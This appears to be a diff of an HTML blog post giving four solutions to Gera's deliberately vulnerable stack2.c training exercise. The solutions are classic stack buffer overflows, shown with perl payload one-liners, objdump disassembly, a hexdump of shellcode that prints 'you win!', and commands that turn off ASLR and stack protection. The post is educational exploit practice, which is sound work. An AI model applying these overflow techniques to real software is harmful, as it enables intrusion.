@@ -21,39 +21,6 @@
     <link rel="stylesheet" type="text/css" href="/static/css/style.md.css" media="screen" />
    </head>
   <body>
-    <style>
-      .collapsible {
-        cursor: pointer;
-        -webkit-user-select: none;
-        -moz-user-select: none;
-        -ms-user-select: none;
-        user-select: none;
-        width: 100%;
-        border: none;
-        text-align: left;
-        outline: none;
-        cursor: pointer;
-      }
-      .collapsible:after {
-        content: "+";
-        transition: transform .3s ease;
-        display: inline-block;
-        font-weight: bold;
-        float: right;
-      }
-      .expanded::after {
-        content: "-";
-        -ms-transform: rotate(360deg);
-        -webkit-transform: rotate(360deg);
-        transform: rotate(360deg);
-      }
-      .nested {
-        display: none;
-      }
-      .active {
-        display: block;
-      }
-    </style>
     <div class="header">
       <table>
         <tr>
@@ -66,11 +33,12 @@
     </div>
     <div class="body">
           <h1 class="h1 collapsible" onclick="toggle(this);">Gera's Warming Up on Stack #2 - Solutions</h1>
-                  <p class="nested"><a href="/posts/20120902_tfm-mmplayer-ppl-seh.html"> « </a>📅 published on <code>02/Jan/2013</code><a href="/posts/20130103_geras-wuos-stack3-solutions.html"> » </a></p>
-                <p class="nested">Following is the part 2 in the series of posts I started back in August 2012 with an aim to provide an analysis and possible solutions for the vulnerable programs provided by <a href="http://corelabs.coresecurity.com/index.php?module=Wiki&amp;action=view&amp;type=researcher&amp;name=Gerardo_Richarte">Gera</a> at his <a href="http://community.corest.com/%7Egera/InsecureProgramming/">Insecure Programming</a> by example page.</p>
+                  <p><a href="/posts/20120902_tfm-mmplayer-ppl-seh.html"> « </a>📅 published on <code>02/Jan/2013</code><a href="/posts/20130103_geras-wuos-stack3-solutions.html"> » </a></p>
+                <h2 class="h2 collapsible" onclick="toggle(this);">Introduction</h2>
+<p class="nested">Following is the part 2 in the series of posts I started back in August 2012 with an aim to provide an analysis and possible solutions for the vulnerable programs provided by <a href="http://corelabs.coresecurity.com/index.php?module=Wiki&amp;action=view&amp;type=researcher&amp;name=Gerardo_Richarte">Gera</a> at his <a href="http://community.corest.com/%7Egera/InsecureProgramming/">Insecure Programming</a> by example page.</p>
 <p class="nested">This post follows the <a href="https://7h3ram.github.io/posts/20120827_geras-wuos-stack1-solutions.html">Gera's Warming Up on Stack #1 - Solutions</a> post and if you have not read it, I request you to please do so. Most of the concepts are very similar and since they have been already talked about, I'll not be reiterating them here.</p>
 <p class="nested">Let's get started. Below is the source for the vulnerable <a href="http://community.corest.com/%7Egera/InsecureProgramming/stack2.html">stack2.c</a> program:</p>
-<p class="nested"re><code class="c">/* stack2.c                                     *
+<pre class="nested"><code class="c">/* stack2.c                                     *
  * specially crafted to feed your brain by gera */
 
 int main() {
@@ -88,28 +56,20 @@ int main() {
 <p class="nested">Like its counterpart <a href="http://community.corest.com/%7Egera/InsecureProgramming/stack1.html">stack1.c</a>, the above program too accepts user-input through the <code>gets</code> function and then looks for a specific value in a local variable named <code>cookie</code>. If this value is equal to a certain pre-defined constant, <code>printf</code> function is used to show a <code>you win!</code> message to the user. There is no direct means of modifying the content of the <code>cookie</code> variable. The <code>gets</code> function will keep reading from the stdin device until it encounters a newline or EoF character. Since this reading loop fails to honor the size of the destination buffer, a classic buffer overflow vulnerability is introduced in the program. Our aim is to leverage this vulnerability and exploit this program so that it prints the <code>you win!</code> message to stdout.</p>
 <p class="nested">Here are a few observations that could be made by looking at the source of the program:</p>
 <ol class="nested">
-<li>Since it is defined prior to <code>buf</code>, the <code>cookie</code> would be placed at
-    a higher memory address on the program stack, just below the saved
-    registers from the function prologue</li>
-<li>The <code>buf</code> character array would be at an offset of at least 80B from
-    <code>cookie</code></li>
-<li>The <code>gets</code> call would accept unbounded user-input within <code>buf</code> array
-    and hence it provides a mechanism to alter the call stack contents</li>
+<li>Since it is defined prior to <code>buf</code>, the <code>cookie</code> would be placed at a higher memory address on the program stack, just below the saved registers from the function prologue</li>
+<li>The <code>buf</code> character array would be at an offset of at least 80B from <code>cookie</code></li>
+<li>The <code>gets</code> call would accept unbounded user-input within <code>buf</code> array and hence it provides a mechanism to alter the call stack contents</li>
 </ol>
 <p class="nested">Stack layout for <a href="http://community.corest.com/%7Egera/InsecureProgramming/stack2.html">stack2.c</a> is identical to <a href="http://community.corest.com/%7Egera/InsecureProgramming/stack1.html">stack1.c</a> as already outlined in the <a href="https://7h3ram.github.io/posts/20120827_geras-wuos-stack1-solutions.html">Gera's Warming Up on Stack #1 - Solutions</a> post.</p>
 <p class="nested">Here are solutions I could think of to get the <code>you win!</code> message printed:</p>
 <ul class="nested">
-<li>Solution #1: Overflow the internal <code>buf</code> array to overwrite
-    <code>cookie</code> with 0x01020305</li>
-<li>Solution #2: Overflow the internal <code>buf</code> array to overwrite EIP
-    with the address of <code>printf(you win!)</code></li>
-<li>Solution #3: Inject a NOP-prefixed <code>printf(you win!)</code> shellcode and
-    overwrite EIP with its address</li>
-<li>Solution #4: Inject a NOP-prefixed <code>printf(you win!)</code> shellcode
-    through an environment var and overwrite EIP with its address</li>
+<li>Solution #1: Overflow the internal <code>buf</code> array to overwrite <code>cookie</code> with <code>0x01020305</code></li>
+<li>Solution #2: Overflow the internal <code>buf</code> array to overwrite EIP with the address of <code>printf(you win!)</code></li>
+<li>Solution #3: Inject a NOP-prefixed <code>printf(you win!)</code> shellcode and overwrite EIP with its address</li>
+<li>Solution #4: Inject a NOP-prefixed <code>printf(you win!)</code> shellcode through an environment var and overwrite EIP with its address</li>
 </ul>
 <p class="nested">Here's a brief description of the test system:</p>
-<p class="nested"re><code># cat /etc/lsb-release | grep DESC ; uname -a | cut -d' ' -f1,3,12-13 ; gcc --version | grep gcc ; cat /proc/cpuinfo | grep -E '(vendor|model|flags)'
+<pre class="nested"><code># cat /etc/lsb-release | grep DESC ; uname -a | cut -d' ' -f1,3,12-13 ; gcc --version | grep gcc ; cat /proc/cpuinfo | grep -E '(vendor|model|flags)'
 DISTRIB_DESCRIPTION=*Ubuntu 10.04.2 LTS*
 Linux 2.6.38 i686 GNU/Linux
 gcc (Ubuntu 4.4.3-4ubuntu5) 4.4.3
@@ -119,9 +79,9 @@ model name  : Intel(R) Core(TM) i3 CPU       M 350  @ 2.27GHz
 flags       : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx lm constant_tsc up pni monitor ssse3 lahf_l
 </code></pre>
 
-<h2 class="h2 collapsible" onclick="toggle(this);">Solution #1: Overflow the internal buf array to overwrite cookie with 0x01020305</h2>
+<h2 class="h2 collapsible" onclick="toggle(this);">Solution #1: Overflow the internal <code>buf</code> array to overwrite cookie with <code>0x01020305</code></h2>
 <p class="nested">Here's the GCC commandline to prepare <a href="http://community.corest.com/%7Egera/InsecureProgramming/stack2.html">stack2.c</a> for this solution:</p>
-<p class="nested"re><code># gcc -mpreferred-stack-boundary=2 -fno-stack-protector -o stack2 stack2.c
+<pre class="nested"><code># gcc -mpreferred-stack-boundary=2 -fno-stack-protector -o stack2 stack2.c
 stack2.c: In function ‘main’:
 stack2.c:8: warning: incompatible implicit declaration of built-in function ‘printf’
 stack2.c:8: warning: format ‘%08x’ expects type ‘unsigned int’, but argument 2 has type ‘char (*)[80]’
@@ -131,14 +91,14 @@ stack2.c:(.text+0x27): warning: the `gets' function is dangerous and should not 
 </code></pre>
 
 <p class="nested">All done, let's exploit <a href="http://community.corest.com/%7Egera/InsecureProgramming/stack2.html">stack2.c</a>:</p>
-<p class="nested"re><code># perl -e 'print &quot;A&quot;x80 . &quot;\x05\x03\x02\x01&quot;' | ./stack2
+<pre class="nested"><code># perl -e 'print &quot;A&quot;x80 . &quot;\x05\x03\x02\x01&quot;' | ./stack2
 buf: bffff4c4 cookie: bffff514
 you win!
 </code></pre>
 
-<h2 class="h2 collapsible" onclick="toggle(this);">Solution #2: Overflow the internal buf array to overwrite EIP with the address of printf(you win!)</h2>
+<h2 class="h2 collapsible" onclick="toggle(this);">Solution #2: Overflow the internal <code>buf</code> array to overwrite EIP with the address of <code>printf(you win!)</code></h2>
 <p class="nested">We need to have a look at the assembly of <a href="http://community.corest.com/%7Egera/InsecureProgramming/stack2.html">stack2.c</a> and find out the location of the <code>printf</code> function which displays the <code>you win!</code> message:</p>
-<p class="nested"re><code class="c-objdump"># objdump -d -M intel stack2 | grep -A20 main.:
+<pre class="nested"><code class="c-objdump"># objdump -d -M intel stack2 | grep -A20 main.:
 08048444 &lt;main&gt;:
  8048444:   55                      push   ebp
  8048445:   89 e5                   mov    ebp,esp
@@ -162,16 +122,16 @@ you win!
  8048487:   90                      nop
 </code></pre>
 
-<p class="nested">The address turns out to be 0x8048479. Let's try exploiting:</p>
-<p class="nested"re><code># perl -e 'print &quot;A&quot;x88 . &quot;\x79\x84\x04\x08&quot;' | ./stack2
+<p class="nested">The address turns out to be <code>0x8048479</code>. Let's try exploiting:</p>
+<pre class="nested"><code># perl -e 'print &quot;A&quot;x88 . &quot;\x79\x84\x04\x08&quot;' | ./stack2
 buf: bffff4c4 cookie: bffff514
 you win!
 Segmentation fault
 </code></pre>
 
-<h2 class="h2 collapsible" onclick="toggle(this);">Solution #3: Inject a NOP-prefixed printf(you win!) shellcode and overwrite EIP with its address</h2>
+<h2 class="h2 collapsible" onclick="toggle(this);">Solution #3: Inject a NOP-prefixed <code>printf(you win!)</code> shellcode and overwrite EIP with its address</h2>
 <p class="nested">Let's first recompile <a href="http://community.corest.com/%7Egera/InsecureProgramming/stack2.html">stack2.c</a> and request GCC to mark program stack as executable. Additionally, we also need to turn ASLR off so that we can have a static return address to overwrite EIP with:</p>
-<p class="nested"re><code># gcc -mpreferred-stack-boundary=2 -fno-stack-protector -z execstack -o stack2 stack2.c 2&gt;/dev/null ; readelf -l stack2 | grep GNU_STACK
+<pre class="nested"><code># gcc -mpreferred-stack-boundary=2 -fno-stack-protector -z execstack -o stack2 stack2.c 2&gt;/dev/null ; readelf -l stack2 | grep GNU_STACK
   GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
 #
 # echo 0 &gt;/proc/sys/kernel/randomize_va_space ; cat /proc/sys/kernel/randomize_va_space
@@ -179,7 +139,7 @@ Segmentation fault
 </code></pre>
 
 <p class="nested">Now lets go ahead with exploitation. The Null-free, NOP-prefixed <code>printf(you win!)</code> shellcode we used to exploit <a href="http://community.corest.com/%7Egera/InsecureProgramming/stack1.html">stack1.c</a> in the <a href="https://7h3ram.github.io/posts/20120827_geras-wuos-stack1-solutions.html">Gera's Warming Up on Stack #1 - Solutions</a> post could be reused here:</p>
-<p class="nested"re><code># ./stack2
+<pre class="nested"><code># ./stack2
 buf: bffff4c4 cookie: bffff514
 #
 # ./stack2
@@ -190,9 +150,9 @@ buf: bffff4c4 cookie: bffff514
 you win!#
 </code></pre>
 
-<h2 class="h2 collapsible" onclick="toggle(this);">Solution #4: Inject a NOP-prefixed printf(you win!) shellcode through an environment var and overwrite EIP with its address</h2>
+<h2 class="h2 collapsible" onclick="toggle(this);">Solution #4: Inject a NOP-prefixed <code>printf(you win!)</code> shellcode through an environment var and overwrite EIP with its address</h2>
 <p class="nested">Lets get straight to exploitation:</p>
-<p class="nested"re><code># echo $WINCODE | hexdump -C
+<pre class="nested"><code># echo $WINCODE | hexdump -C
 00000000  eb 16 31 c0 31 db 31 d2  b0 04 b3 01 59 b2 20 cd  |..1.1.1.....Y. .|
 00000010  80 31 c0 40 31 db cd 80  e8 e5 ff ff ff 79 6f 75  |.1.@1........you|
 00000020  20 77 69 6e 21 20 0d 0a                           | win! ..|
@@ -207,20 +167,19 @@ you win!
 </code></pre>
 
 <p class="nested">So, we have now successfully exploited the <a href="http://community.corest.com/%7Egera/InsecureProgramming/stack2.html">stack2.c</a> program through four different techniques. Depending on the motive of your exploitation attempt, other techniques could be devised and some, mentioned here, be rejected.</p>
+<h2 class="h2 collapsible" onclick="toggle(this);">Conclusion</h2>
 <p class="nested">Like I said, earlier, these solutions are not practical anymore. They just serve the purpose of understanding how exploits used to work before mitigation features were introduced in modern systems. But, as with everything else, understanding basics is really important. As mitigation features mature, exploitation techniques become increasingly complex. And to understand those, we need to build upon the solid foundation of basic concepts, like those discussed on this and other blogs.</p>
-        <p class="nested" style="text-align:center;">(🔖 tagged <a href=/tags.html#ctf>ctf</a> and <a href=/tags.html#exploit>exploit</a>)</p>
-                  <p class="nested" style="text-align:center;">« <a href="/posts/20120902_tfm-mmplayer-ppl-seh.html">TFM MMPlayer .ppl File Parsing...</a> « | » <a href="/posts/20130103_geras-wuos-stack3-solutions.html">Gera's Warming Up on Stack #3 ...</a> »</p>
+        <p style="text-align:center;">(🔖 tagged <a href=/tags.html#ctf>ctf</a> and <a href=/tags.html#exploit>exploit</a>)</p>
+                  <p style="text-align:center;">« <a href="/posts/20120902_tfm-mmplayer-ppl-seh.html">TFM MMPlayer .ppl File Parsing...</a> « | » <a href="/posts/20130103_geras-wuos-stack3-solutions.html">Gera's Warming Up on Stack #3 ...</a> »</p>
             </div>
     <script>hljs.initHighlightingOnLoad();</script>
     <script>hljs.initLineNumbersOnLoad();</script>
     <script>
       function toggle(elem) {
         elem.classList.toggle("expanded");
-
-        var ish2 = false; var ish3 = false;
-        if (elem.classList.contains("h2")) { ish2=true; }; if (elem.classList.contains("h3")) { ish3=true; }
-        console.log(elem); console.log(ish2); console.log(ish3);
-
+        var ish2=false; var ish3=false; var ish4=false;
+        if (elem.classList.contains("h2")) { ish2=true; }; if (elem.classList.contains("h3")) { ish3=true; }; if (elem.classList.contains("h4")) { ish4=true; }
+        console.log(elem); console.log(ish2); console.log(ish3); console.log(ish4);
         var sibling = elem.nextElementSibling;
         while (sibling) {
           if (ish2 && sibling.classList.contains("h2")) {
@@ -228,6 +187,10 @@ you win!
             break;
           }
           if (ish3 && (sibling.classList.contains("h2") || sibling.classList.contains("h3"))) {
+            sibling.classList.toggle("active");
+            break;
+          }
+          if (ish4 && (sibling.classList.contains("h2") || sibling.classList.contains("h3") || sibling.classList.contains("h4"))) {
             sibling.classList.toggle("active");
             break;
           }
